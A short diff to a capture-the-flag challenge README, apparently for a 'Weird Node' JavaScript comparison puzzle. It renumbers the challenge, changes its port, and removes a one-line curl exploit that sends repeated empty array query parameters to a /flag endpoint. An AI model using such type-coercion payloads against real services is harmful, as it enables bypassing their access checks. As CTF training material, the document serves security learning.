@@ -1,4 +1,4 @@
-Weird Node 1
+Weird Node 3
 ---------
 
 Javascript weird compares.
@@ -8,7 +8,7 @@ Javascript weird compares.
 ```
 Get the flag.
 
-http://ctf.pwn.sg:8081
+http://ctf.pwn.sg:8083
 ```
 
 *Creator -  quanyang (@quanyang)*
@@ -25,5 +25,4 @@ http://ctf.pwn.sg:8081
 # Exploit Details
 
 ```
-curl -g 'localhost:8081/flag?first[]=&first[]=&first[]=&first[]=&first[]=&first[]=&first[]=&first[]='
 ```
